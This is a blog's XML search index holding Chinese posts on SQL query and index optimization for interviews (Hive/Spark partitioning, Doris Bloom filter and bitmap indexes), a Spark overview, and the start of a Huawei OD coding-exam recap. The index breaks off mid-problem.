<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>日拱一卒 Vol.001</title>
      <link href="/blog/bd61c145.html/"/>
      <url>/blog/bd61c145.html/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：</strong></p><p>假设你负责电商交易数据的分析，现有以下三张核心表：</p><ul><li><code>orders</code>（订单表）：order_id, user_id, order_time, total_amount</li><li><code>order_items</code>（订单明细）：item_id, order_id, product_id, quantity, price</li><li><code>users</code>（用户表）：user_id, registration_time, city</li></ul><p><strong>业务需求：</strong></p><p>计算2023年第二季度（4月-6月）每个城市的“高价值用户数”。</p><p>定义：高价值用户需同时满足以下条件：</p><ol><li>在该季度内下单次数 ≥ 3次</li><li>该季度累计订单金额 ≥ 5000元</li><li>首次注册时间在2023年之前</li></ol><p>请写出SQL实现，并说明你的优化思路?</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    u.city,</span><br><span class="line">    <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> u.user_id) <span class="keyword">AS</span> high_value_user_count</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    users u</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> (</span><br><span class="line">    <span class="comment">-- 步骤1：在订单层聚合，先过滤出Q2的订单，并计算每个用户的指标</span></span><br><span class="line">    <span class="keyword">SELECT</span> </span><br><span class="line">        user_id,</span><br><span class="line">        <span class="built_in">COUNT</span>(order_id) <span class="keyword">AS</span> order_count,</span><br><span class="line">        <span class="built_in">SUM</span>(total_amount) <span class="keyword">AS</span> total_amount</span><br><span class="line">    <span class="keyword">FROM</span> </span><br><span class="line">        orders</span><br><span class="line">    <span class="keyword">WHERE</span> </span><br><span class="line">        order_time <span class="operator">&gt;=</span> <span class="string">&#x27;2023-04-01&#x27;</span> </span><br><span class="line">        <span class="keyword">AND</span> order_time <span class="operator">&lt;</span> <span class="string">&#x27;2023-07-01&#x27;</span>  <span class="comment">-- 使用&lt;号是更标准的做法，避免包含7月1日零点</span></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">        user_id</span><br><span class="line">    <span class="keyword">HAVING</span> </span><br><span class="line">        <span class="built_in">COUNT</span>(order_id) <span class="operator">&gt;=</span> <span class="number">3</span> </span><br><span class="line">        <span class="keyword">AND</span> <span class="built_in">SUM</span>(total_amount) <span class="operator">&gt;=</span> <span class="number">5000</span>  <span class="comment">-- 步骤2：在聚合后直接过滤出高价值用户</span></span><br><span class="line">) o </span><br><span class="line"><span class="keyword">ON</span> u.user_id <span class="operator">=</span> o.user_id  <span class="comment">-- 关联上满足高价值行为的用户</span></span><br><span class="line"><span class="keyword">WHERE</span> </span><br><span class="line">    u.registration_time <span class="operator">&lt;</span> <span class="string">&#x27;2023-01-01&#x27;</span>  <span class="comment">-- 步骤3：进一步过滤出老用户</span></span><br><span class="line">    <span class="comment">-- AND u.city IS NOT NULL -- 可选：处理城市为NULL的情况</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">    u.city;</span><br></pre></td></tr></table></figure><p><strong>优化思路说明：</strong></p><ol><li><strong>减少嵌套：</strong> 将订单聚合和高价值用户判定合并到一个子查询中，使用 <code>HAVING</code>子句进行过滤，结构更清晰。</li><li><strong>性能考量：</strong><ul><li>建议在 <code>orders(user_id, order_time)</code>上建立联合索引，这样在按用户分组和按时间过滤时可以利用索引。</li><li>建议在 <code>users(user_id, registration_time)</code>上建立索引以加速关联和筛选。</li></ul></li><li><strong>严谨性：</strong> 使用明确的日期格式，并考虑了时间范围的边界。</li></ol><h3 id="索引是什么？"><a href="#索引是什么？" class="headerlink" title="索引是什么？"></a>索引是什么？</h3><p>简单来说，<strong>索引就像一本书的目录</strong>。如果没有目录，你要找某个主题的内容，只能一页一页地翻（全表扫描）。而有了目录，你可以快速定位到内容所在的页码（数据所在的数据块），大大加快查找速度。</p><p>在数据库中，索引是一种独立的数据结构（如B-Tree, Bitmap, LSM-Tree等），它存储了表中某些列（索引键）的值以及这些值对应数据行的物理地址指针。</p><p><strong>在你这个查询中的具体作用：</strong></p><ul><li><strong>子查询部分：</strong> <code>SELECT user_id, COUNT(...) FROM orders WHERE order_time &gt;= &#39;2023-04-01&#39; AND order_time &lt; &#39;2023-07-01&#39; GROUP BY user_id</code><ul><li>如果没有索引，查询引擎需要<strong>全表扫描</strong> <code>orders</code>表，读取每一行数据，检查时间条件，然后进行分组聚合。如果表有几十亿条记录，这将非常缓慢。</li><li>如果存在 <code>(user_id, order_time)</code>的联合索引：<ul><li><strong>过滤 (<code>WHERE</code>)：</strong> 引擎可以快速地在索引树中定位到 <code>order_time</code>在 <code>[&#39;2023-04-01&#39;, &#39;2023-07-01&#39;)</code>范围内的索引条目，避免扫描全部数据。</li><li><strong>分组 (<code>GROUP BY user_id</code>)：</strong> 因为索引的第一列就是 <code>user_id</code>，并且索引条目是按照 <code>(user_id, order_time)</code>排序的。这意味着<strong>同一个user_id的所有订单（在时间范围内的）在索引中是紧挨着存储的</strong>。引擎可以顺序读取索引，轻松地完成分组计数和求和，这是一个非常高效的过程（称为“索引排序分组”）。</li></ul></li></ul></li><li><strong>主查询部分：</strong> <code>INNER JOIN ... ON u.user_id = o.user_id WHERE u.registration_time &lt; &#39;2023-01-01&#39;</code><ul><li><code>users</code>表上的 <code>(user_id, registration_time)</code>索引同样可以加速关联时的查找和注册时间的过滤。</li></ul></li></ul><h4 id="场景一：Hive-x2F-Spark-SQL-on-HDFS"><a href="#场景一：Hive-x2F-Spark-SQL-on-HDFS" class="headerlink" title="场景一：Hive &#x2F; Spark SQL (on HDFS)"></a>场景一：Hive &#x2F; Spark SQL (on HDFS)</h4><ul><li><p><strong>核心特点：</strong> 数据存储在HDFS上，格式多为列式（ORC, Parquet）。<strong>传统意义上的B-Tree索引在原生Hive中几乎不存在</strong>，因为HDFS不支持随机写，更新索引成本极高。</p></li><li><p><strong>“索引”的替代方案：</strong></p><ol><li><p><strong>分区（Partitioning）：</strong> 这是Hive&#x2F;Spark中<strong>最重要、最高效</strong>的“粗粒度索引”。你可以按日期（如 <code>dt</code>）对 <code>orders</code>表进行分区。</p><p>sql</p><p>复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 创建分区表</span><br><span class="line">CREATE TABLE orders (...)</span><br><span class="line">PARTITIONED BY (dt STRING); -- 按天分区，例如 dt=&#x27;2023-04-01&#x27;</span><br><span class="line"></span><br><span class="line">-- 你的查询条件会变成，性能极大提升</span><br><span class="line">WHERE dt &gt;= &#x27;2023-04-01&#x27; AND dt &lt;= &#x27;2023-06-30&#x27;</span><br></pre></td></tr></table></figure><p><em>引擎只会读取2023年Q2这91个分区的数据，而不是全表。</em></p></li><li><p><strong>分桶（Bucketing）：</strong> 如果经常按 <code>user_id</code>进行分组或关联，可以对表进行分桶。</p><p>sql</p><p>复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE orders (...)</span><br><span class="line">PARTITIONED BY (dt STRING)</span><br><span class="line">CLUSTERED BY (user_id) INTO 1024 BUCKETS;</span><br></pre></td></tr></table></figure><p><em>相同 <code>user_id</code>的数据会落在同一个桶内，能优化 <code>GROUP BY</code>和 <code>JOIN</code>。</em></p></li><li><p><strong>ORC&#x2F;Parquet文件内部索引：</strong> 列式存储格式本身会为每个数据块记录min&#x2F;max等统计信息。如果查询 <code>order_time &gt; &#39;2023-04-01&#39;</code>，引擎可以直接跳过那些最大值 <code>&lt; &#39;2023-04-01&#39;</code>的数据块。这可以看作是一种“轻量级索引”。</p></li></ol></li><li><p><strong>面试回答建议：</strong> 当被问及Hive&#x2F;Spark的优化时，应优先强调 <strong>分区和分桶</strong> 的设计，而不是谈B-Tree索引。</p></li></ul><h4 id="场景二：Doris-x2F-ClickHouse-x2F-StarRocks-MPP数据库"><a href="#场景二：Doris-x2F-ClickHouse-x2F-StarRocks-MPP数据库" class="headerlink" title="场景二：Doris &#x2F; ClickHouse &#x2F; StarRocks (MPP数据库)"></a>场景二：Doris &#x2F; ClickHouse &#x2F; StarRocks (MPP数据库)</h4><ul><li><p><strong>核心特点：</strong> 这类现代OLAP数据库<strong>原生支持多种索引</strong>，并且针对大数据分析场景做了深度优化。</p><ol><li><p><strong>前缀索引（Aggregate Key）：</strong> 这是Doris的核心特性。在建表时，你指定的排序列（例如 <code>(user_id, order_time)</code>）会自动构成一个稀疏索引，数据按这些列排序存储。你的查询条件完美匹配前缀，可以极速定位数据。</p><p>sql</p><p>复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE orders (</span><br><span class="line">    user_id BIGINT,</span><br><span class="line">    order_time DATETIME,</span><br><span class="line">    ...</span><br><span class="line">)</span><br><span class="line">DUPLICATE KEY(user_id, order_time) -- 指定排序列，自动生成前缀索引</span><br><span class="line">...;</span><br></pre></td></tr></table></figure></li><li><p><strong>Bloom Filter索引：</strong> 特别适用于高基数列的等值查询（如 <code>user_id = 123</code>）。Doris会自动为某些列创建Bloom Filter，可以快速判断“某个user_id肯定不在这个数据块中”，从而跳过该数据块。</p></li><li><p><strong>二级索引（BitMap Index）：</strong> 适用于低基数列（如 <code>city</code>, <code>product_category</code>）的等值或范围查询。</p></li></ol></li></ul><h3 id="核心定义"><a href="#核心定义" class="headerlink" title="核心定义"></a>核心定义</h3><ul><li><strong>高基数列：</strong> 指该列中<strong>不重复值数量非常多</strong>（接近总行数）的列。</li><li><strong>低基数列：</strong> 指该列中<strong>不重复值数量非常少</strong>（远小于总行数）的列。</li></ul><p><strong>一个简单的比喻：</strong></p><ul><li>想象一个学校的学生花名册。<ul><li><strong>高基数</strong> 就像 <strong>“学生身份证号”</strong>：几乎每个学生都有一个独一无二的号码。</li><li><strong>低基数</strong> 就像 <strong>“学生性别”</strong>：只有“男”、“女”等少数几个值。</li><li><strong>中等基数</strong> 就像 <strong>“学生班级”</strong>：有几十个不同的班级，但有很多学生共享同一个班级。</li></ul></li></ul><h3 id="为什么区分高低基数很重要？"><a href="#为什么区分高低基数很重要？" class="headerlink" title="为什么区分高低基数很重要？"></a>为什么区分高低基数很重要？</h3><p>区分高低基数的主要意义在于<strong>指导我们选择最合适的数据处理技术和优化策略</strong>。</p><h4 id="1-索引选择"><a href="#1-索引选择" class="headerlink" title="1. 索引选择"></a>1. 索引选择</h4><p>这是你最开始的提问背景，也是最直接的应用。</p><ul><li><strong>低基数列：</strong> 适合 <strong>位图索引</strong><ul><li><strong>原理：</strong> 为每个不同的值（如 ‘M’, ‘F’）创建一个位图（bitmap），每一位表示一行是否是该值。例如：<ul><li><code>gender = &#39;M&#39;</code>的位图：<code>10101...</code>(表示第1、3、5…行是男性)</li><li><code>gender = &#39;F&#39;</code>的位图：<code>01010...</code>(表示第2、4…行是女性)</li></ul></li><li><strong>优势：</strong> 对 <code>WHERE gender = &#39;M&#39; AND status = &#39;active&#39;</code>这样的多条件查询，只需对两个位图进行高效的 <code>AND</code>操作，速度极快。</li><li><strong>劣势：</strong> 如果列基数很高，位图会变得非常稀疏和巨大，反而浪费空间、降低性能。</li></ul></li><li><strong>高基数列：</strong> 适合 <strong>B-Tree索引</strong> 或 <strong>Bloom Filter索引</strong><ul><li><strong>B-Tree索引：</strong> 适合范围查询（<code>WHERE user_id &gt; 1000</code>）和排序。</li><li><strong>Bloom Filter索引：</strong> 这是一种概率型数据结构，主要用于快速判断“某个值<strong>肯定不存在</strong>”于某个数据块中。对于 <code>WHERE user_id = 123456</code>这样的点查询，Bloom Filter可以快速跳过那些肯定不包含 <code>user_id=123456</code>的数据文件，减少IO。Doris&#x2F;ClickHouse 广泛使用它来优化高基数列的查询。</li></ul></li></ul><h4 id="2-数据编码与压缩"><a href="#2-数据编码与压缩" class="headerlink" title="2. 数据编码与压缩"></a>2. 数据编码与压缩</h4><ul><li><strong>低基数列：</strong> 非常适合 <strong>字典编码</strong><ul><li><strong>原理：</strong> 创建一个字典：<code>&#123;&#39;M&#39; -&gt; 1, &#39;F&#39; -&gt; 2&#125;</code>，然后将表中所有的 ‘M’ 替换成 1，所有的 ‘F’ 替换成 2。存储时只需存储紧凑的数字1和2，以及一个小小的字典表。压缩率非常高。</li></ul></li><li><strong>高基数列：</strong> 字典编码效果不佳，因为字典本身会非常大。通常采用其他通用压缩算法。</li></ul><h4 id="3-数据分布与分桶策略"><a href="#3-数据分布与分桶策略" class="headerlink" title="3. 数据分布与分桶策略"></a>3. 数据分布与分桶策略</h4><p>在 Spark&#x2F;Hive 中，当我们使用 <code>CLUSTERED BY</code>（分桶）时，选择分桶键至关重要。</p><ul><li><strong>理想的分桶键应该是高基数列</strong>，如 <code>user_id</code>。这样才能保证数据被均匀地分散到各个桶中，避免数据倾斜。如果用一个低基数列（如 <code>gender</code>）分桶，会导致数据严重倾斜（可能只有2个桶，每个桶非常大）。</li></ul><h4 id="4-查询性能"><a href="#4-查询性能" class="headerlink" title="4. 查询性能"></a>4. 查询性能</h4><ul><li>**对低基数列进行 <code>GROUP BY</code>或 <code>DISTINCT</code>**：速度非常快，因为需要处理的分组很少。<ul><li><code>SELECT city, COUNT(*) FROM users GROUP BY city;</code>– 即使表很大，分组数也有限。</li></ul></li><li>**对高基数列进行 <code>GROUP BY</code>或 <code>DISTINCT</code>**：可能会很慢，消耗大量内存，因为需要为海量的不重复值维护中间状态。<ul><li><code>SELECT user_id, COUNT(*) FROM click_log GROUP BY user_id;</code>– 如果用户数上亿，这个查询压力很大。</li></ul></li></ul><h3 id="面试场景"><a href="#面试场景" class="headerlink" title="面试场景"></a>面试场景</h3><p>如果面试官追问：“为什么你建议在Doris里对 <code>user_id</code>使用Bloom Filter索引，而不是位图索引？”</p><p>你现在可以这样回答：</p><p>“因为 <code>user_id</code>是一个典型的高基数列，它的不重复值数量巨大（可能上亿）。如果使用位图索引，会产生上亿个非常稀疏的位图，占用大量空间且性能低下。而Bloom Filter索引是专门为这种高基数列的等值查询优化设计的，它用很小的空间代价就能快速过滤掉不相关的数据块，性价比非常高。相反，如果是对 <code>order_status</code>这种只有几个状态值的低基数列进行过滤，位图索引就是最佳选择。”</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">--  技术镜鉴：</span><br><span class="line">1. 谓词下推：在数据量大的情况下，经可能将where条件放置在内层的子查询中，使它尽可能早的过滤掉大量不符合条件的数据。</span><br><span class="line">2. 关联条件：在关联条件中可以加入对关联表的整体过滤条件，从而减少子查询的层级。</span><br><span class="line">3. 数据过滤：对完整查询结果可以在最后使用having函数进行过滤。</span><br><span class="line">4. 边界考虑：在实际生产环境中，应该考虑到数据可能为空的情况，并提出解决和处理的方案。</span><br><span class="line">5. 构建索引：通过对数据表构建合适的索引，加快数据检索和关联的效率。</span><br><span class="line"></span><br><span class="line">-- 索引是什么？简单来说索引就像一本书的目录。倘若没有目录，你要找某个主题的内容，就只能一页一页的翻找（全表扫描）。而有了目录，就可以快速定位到内容所在的位置（数据所在的数据块），大大的加速了查询效率。</span><br><span class="line">-- 官方概念：索引是一种独立的数据结构，它存储了表中某些列（索引键）的值以及这些值对应数据行的物理地址指针。</span><br><span class="line">-- 对比差异：</span><br><span class="line">-- 如果没有索引：查询引擎需要全表扫描，读取每一行数据，检查时间条件，然后分组聚合。若表有几十亿条数据，这将是一个非常缓慢的过程。</span><br><span class="line">-- 若存在 user_id,order_time的联合索引：</span><br><span class="line">-- 1. where过滤，引擎可以快速定位到order_time在时间范围内的索引条目，避免全表扫描。</span><br><span class="line">-- 2. group by分组，因为索引的第一列是user_id，并且索引条目是按照（user_id,order_time）排序的。这意味着每一个user_id的所有订单在索引中是紧挨着存储的。引擎就可以顺序读取索引，轻松的完成分组和聚合，这个高效的过程被称之为：“索引排序分组”</span><br><span class="line">-- 如何创建索引：不同数据库中语法略微不同，但核心思想一致。</span><br><span class="line">-- 类MySQL语法</span><br><span class="line">create index idx_orders_user_time on orders(user_id, order_time);</span><br><span class="line">-- 不同的查询引擎索引机制有着本质的不同比如：hive/spark sql基于hdfs存储 和 doris/clickhouse</span><br><span class="line"></span><br><span class="line">-- hive/spark 其核心的特点是数据存储在hdfs上，格式为列式，传统的索引在原生的hive中几乎不存在，因为hdfs不支持随机写，更新索引的成本极高。</span><br><span class="line">-- 因此作为索引的替代方案：着重于分区和分桶的设计 (分区和分桶是“设计时”的优化，而索引是“运行时”的优化)</span><br><span class="line">-- 1.分区（partition）是最重要、最高效的“粗粒度索引”，可以按照日期dt进行分区，读取特点分区的数据。</span><br><span class="line">-- 2.分桶（bucket）若按照user_id进行分组或关联，可以对表进行分桶。相同的user_id的数据会落在同一个桶中，能够优化group by 和join。</span><br><span class="line">-- 3.orc/parquet文件内部索引：列式存储格式会为每个数据块记录min/max等统计信息，若查询order_tiem &gt; 20251103 引擎可以直接跳过不符合的数据块，这可以看做一种轻量级的索引。</span><br><span class="line"></span><br><span class="line">-- doris为代表的MPP（大规模并行处理）数据库</span><br><span class="line">-- 原生支持多种索引，且针对大数据分析场景做了深度优化。</span><br><span class="line">-- 1. 前缀索引，这是doris的核心特性。在建表时，你指定的排序列（如user_id，order_time）会自动构成一个稀疏索引，数据按这些排序存储。当前查询条件完美匹配前缀，可以极速定位数据。</span><br><span class="line">-- 2. 布隆过滤器：特别适用于高基数列的等值查询（如user_id = 123）.doris会自动为某些列创建 bloom filter，可以快速判断某个 user_id肯定不会在这个数据块中，从而跳过这个数据块。</span><br><span class="line">-- 3. 二级索引：适用于低基数列（如city,product_category）的等值或者范围查询。</span><br><span class="line"></span><br><span class="line">-- 性能优化的势能轨迹：首先给出通用的索引概念，然后主动反问“当前的技术栈是什么”是基于hive/spark的离线数仓，还是doris的实时数仓？知己知彼，对症下游，根据反馈细谈针对数仓的具体优化方案。技术的广度与沟通的能力最终要映射在业务场景的理解能力。</span><br><span class="line"></span><br><span class="line">-- 高基数列:指列中不重复数值非常多的列。</span><br><span class="line">-- 低基数列:指列中不重复数值非常少的列。</span><br><span class="line">-- 比如一个公司的花名册，员工的身份证号就是高基数列，每一个员工都有一个独一无二的身份证号。而员工的性别就是一个低基数列，只有男女等少数几个值。中等奇数即公司的部门，一个公司可能有十几二十个部门。</span><br><span class="line">-- 区分高低基数的主要意义在于指导我们选择最合适的数据处理技术和优化策略。</span><br><span class="line">-- 低基数列适合位图索引，原理创建一个位图bitmap，每一位表示一行是否有该值，如果基数列很高，位图就会变得非常稀疏和巨大，反而浪费空间、降低性能。且适合于字典编码，将内容映射为连续的数字，压缩效率高。</span><br><span class="line">-- 高基数列适合于B-Tree索引（适合范围查询）或者 bloom filter索引（一种概率型模型，主要用于快速判断“某个值肯定不在”某个数据块中）。</span><br><span class="line">-- 数据分布与分桶策略：理想的分桶键应该是高基数列，这样才能保证数据被均匀的分散到各个桶中，避免数据倾斜。</span><br><span class="line">-- 为什么建议在Doris里对 user_id使用Bloom Filter索引，而不是位图索引？</span><br><span class="line">-- 因为 user_id是一个典型的高基数列，它的不重复值数量巨大（可能上亿）。</span><br><span class="line">-- 如果使用位图索引，会产生上亿个非常稀疏的位图，占用大量空间且性能低下。</span><br><span class="line">-- 而Bloom Filter索引是专门为这种高基数列的等值查询优化设计的，它用很小的空间代价就能快速过滤掉不相关的数据块，性价比非常高。</span><br><span class="line">-- 相反，如果是对 order_status这种只有几个状态值的低基数列进行过滤，位图索引就是最佳选择。 </span><br></pre></td></tr></table></figure><h3 id="内容归纳与升华"><a href="#内容归纳与升华" class="headerlink" title="内容归纳与升华"></a>内容归纳与升华</h3><p>我将你的精彩总结重新组织成一个更体系化的框架，方便你面试时清晰地呈现知识深度。</p><h4 id="一、SQL优化核心思想"><a href="#一、SQL优化核心思想" class="headerlink" title="一、SQL优化核心思想"></a><strong>一、SQL优化核心思想</strong></h4><ol><li><strong>减少数据量原则</strong>：这是优化的黄金法则。<ul><li><strong>谓词下推</strong>：在查询的最内层尽早过滤数据。</li><li><strong>有效索引</strong>：通过索引直接定位所需数据块，避免全表扫描。</li></ul></li><li><strong>简化计算复杂度原则</strong>：<ul><li><strong>减少嵌套</strong>：扁平化的SQL更易读，也给了查询优化器更多优化空间。</li><li>**合理使用<code>HAVING</code>**：仅对聚合后的结果进行过滤，避免先聚合大量数据再丢弃。</li></ul></li><li><strong>鲁棒性原则</strong>：<ul><li><strong>边界情况处理</strong>：考虑<code>NULL</code>值、数据倾斜、空值等生产环境中常见问题。</li></ul></li></ol><h4 id="二、索引技术选型矩阵（面试核心武器）"><a href="#二、索引技术选型矩阵（面试核心武器）" class="headerlink" title="二、索引技术选型矩阵（面试核心武器）"></a><strong>二、索引技术选型矩阵（面试核心武器）</strong></h4><p>这是一个可以直观展示你技术深度的框架：</p><table><thead><tr><th align="left"><strong>列类型</strong></th><th align="left"><strong>核心问题</strong></th><th align="left"><strong>Hive&#x2F;Spark (离线批处理)</strong></th><th align="left"><strong>Doris&#x2F;ClickHouse (实时交互)</strong></th><th align="left"><strong>优化目标</strong></th></tr></thead><tbody><tr><td align="left"><strong>所有列</strong></td><td align="left"><strong>如何快速跳过无关数据？</strong></td><td align="left"><strong>分区(Partitioning)</strong>  • 按时间、地域等粗粒度划分</td><td align="left"><strong>排序(Ordering Key)</strong>  • 数据按排序列物理排序</td><td align="left"><strong>粗粒度数据裁剪</strong></td></tr><tr><td align="left"><strong>高基数列</strong>  (如<code>user_id</code>)</td><td align="left"><strong>如何高效进行等值查询？</strong></td><td align="left"><strong>分桶(Clustering&#x2F;Bucketing)</strong>  • 将数据散列到多个桶，优化<code>JOIN</code>&#x2F;<code>GROUP BY</code></td><td align="left"><strong>Bloom Filter索引</strong>  • 概率性判断“数据不存在”，快速跳过数据块</td><td align="left"><strong>避免数据倾斜，加速点查询</strong></td></tr><tr><td align="left"><strong>低基数列</strong>  (如<code>status</code>)</td><td align="left"><strong>如何高效进行多条件过滤？</strong></td><td align="left"><strong>列式存储统计信息</strong>  • ORC&#x2F;Parquet的Min&#x2F;Max索引</td><td align="left"><strong>位图索引(Bitmap Index)</strong>  • 对每个值生成位图，支持快速<code>AND</code>&#x2F;<code>OR</code>运算</td><td align="left"><strong>极致压缩，快速多条件过滤</strong></td></tr></tbody></table><p><strong>面试话术建议</strong>：“当谈到优化时，我的思路是一个决策树：首先看业务场景和技术栈。如果是Hive&#x2F;Spark，我优先考虑<strong>分区和分桶</strong>的设计。如果是Doris，我会利用其<strong>前缀索引和Bloom Filter</strong>。其次，我会分析查询模式涉及的列是<strong>高基数还是低基数</strong>，从而选择最合适的索引类型，比如对<code>user_id</code>用Bloom Filter，对<code>status</code>用位图索引。”</p><h4 id="三、高低基数：数据处理的“第一性原理”"><a href="#三、高低基数：数据处理的“第一性原理”" class="headerlink" title="三、高低基数：数据处理的“第一性原理”"></a><strong>三、高低基数：数据处理的“第一性原理”</strong></h4><p>你的理解非常准确。高低基数是决定数据分布、存储、压缩和查询性能的底层属性。</p><ul><li><strong>低基数 -&gt; 高重复 -&gt; 适合压缩、位图索引</strong>（思考：如何利用“重复”）</li><li><strong>高基数 -&gt; 低重复 -&gt; 适合散列、Bloom Filter</strong>（思考：如何管理“唯一”）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术镜鉴 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每日分享 Spark</title>
      <link href="/blog/e1a8e7f.html/"/>
      <url>/blog/e1a8e7f.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简述什么是spark？"><a href="#一、简述什么是spark？" class="headerlink" title="一、简述什么是spark？"></a>一、简述什么是spark？</h1><blockquote><ol><li>spark是一个计算引擎；</li><li>spark是基于内存运算的，比传统的hadoop计算引擎速度要快；</li><li>spark支持多种部署模式，单机部署、独立部署模式、yarn、mesos、k8s等；</li><li>spark可以读取多种数据存储系统或者组件数据，例如hdfs、hbase、hive等；</li></ol></blockquote><blockquote><p>首先描述spark的简介，一句话概括。其次描述其特点，最后理论到实践，描述其应用场景。</p><p>简介 → 特点 → 应用场景</p><ul><li>简介：spark由scala语言构建的、内存计算引擎，针对大规模数据集和复杂的数据处理任务，提供了高效的数据处理能力。</li><li>特点：<ul><li>易用：<ul><li>（数据介质自由）它可以和任何存储系统进行连接，如本地存储系统、HDFS、Hive、Hbase等；</li><li>（资源管理器自由）资源管理器可选本地模式、独立部署模式、yarn、mesos、k8s等；</li><li>（编程语言自由）spark提供了丰富的api和易于使用的编程模型；</li></ul></li><li>快速：<ul><li>源于其利用内存进行计算和基于RDD的弹性数据集模型；</li></ul></li><li>通用：（神通广大）<ul><li>批处理、流处理、交互式查询（spark sql）、机器学习（MLlib）</li></ul></li></ul></li><li>应用场景：<ul><li>大规模数据处理：适用于PB级别的数据，可以快速执行复杂的数据转换和分析任务。</li><li>实时数据处理：spark streaming 处理实时流数据，支持低时延的数据处理需求。</li><li>机器学习：MLlib提供了一系列机器学习算法，可用于大规模数据的建模和预测。</li><li>数据探索和可视化：通过spark  sql 和 dataframe api 可以进行交互式的数据探索和分析，支持复杂的查询和可视化操作。</li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每日分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为OD 机考面试题</title>
      <link href="/blog/de43bd01.html/"/>
      <url>/blog/de43bd01.html/</url>
      
        <content type="html"><![CDATA[<blockquote><p>昨天晚上参加了华为OD的机考，记录一下考试流程，顺便做个复盘。</p></blockquote><h1 id="一、华为OD机考流程"><a href="#一、华为OD机考流程" class="headerlink" title="一、华为OD机考流程"></a>一、华为OD机考流程</h1><ul><li>考试流程<ul><li>邮箱接收考试地址</li><li>电脑网页登入，确认个人信息</li><li>开启摄像头，并拍照（考试过程全程开启）</li><li>开启全屏幕录制</li><li>手机扫描二维码，进入小程序页面（必须在这个页面停留，手机常亮，直到交卷）</li><li>开始考试（3到算法题，一共400分，分值分布100、100、150，150及格）</li></ul></li></ul><h1 id="二、灰度图"><a href="#二、灰度图" class="headerlink" title="二、灰度图"></a>二、灰度图</h1><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">题干：</span><br><span class="line">黑白图像常采用灰度图的方式存储，即图像的每个像素填充一个灰阶值。</span><br><span class="line"><span class="number">256</span>阶灰度图是一个灰阶值取值范围为<span class="number">0</span>-<span class="number">255</span>的灰阶矩阵，<span class="number">0</span>表示全黑、<span class="number">255</span>表示全白，范围内的其他值表示不同的灰度。</span><br><span class="line">比如下面的图像及其对应的灰阶矩阵</span><br><span class="line"><span class="number">10</span> <span class="number">10</span> <span class="number">255</span> <span class="number">34</span> <span class="number">0</span> <span class="number">1</span> <span class="number">255</span> <span class="number">8</span> <span class="number">0</span> <span class="number">3</span> <span class="number">255</span> <span class="number">6</span> <span class="number">0</span> <span class="number">5</span> <span class="number">255</span> <span class="number">4</span> <span class="number">0</span> <span class="number">7</span> <span class="number">255</span> <span class="number">2</span> <span class="number">0</span> <span class="number">9</span> <span class="number">255</span> <span 